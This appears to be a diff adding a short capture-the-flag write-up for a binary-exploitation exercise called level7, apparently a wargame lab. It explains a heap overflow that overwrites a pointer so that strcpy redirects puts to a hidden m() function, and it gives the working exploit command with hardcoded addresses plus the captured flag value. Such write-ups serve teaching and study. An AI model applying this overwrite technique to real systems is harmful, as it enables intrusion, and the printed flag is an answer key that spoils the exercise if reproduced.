@@ -1,0 +1,23 @@
+by reading reversed level7
+
+we discover at first:
+			- 4 malloc of 0x8
+			- 2 strcpy
+			- 1 fopen
+			- 1 puts
+			- 1 m()
+
+m() aim to print a string and timestamp by "%s - %d"
+
+each strcpy take one program's argument
+so we need 2 arg
+
+after more research 
+address of 2nd and 4th malloc are store in malloc 1st and 3rd.
+in strcpy they use is address in store in these malloc
+As previous level, we overwrite addresses and redirect 
+puts to m() function
+
+
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1580653537
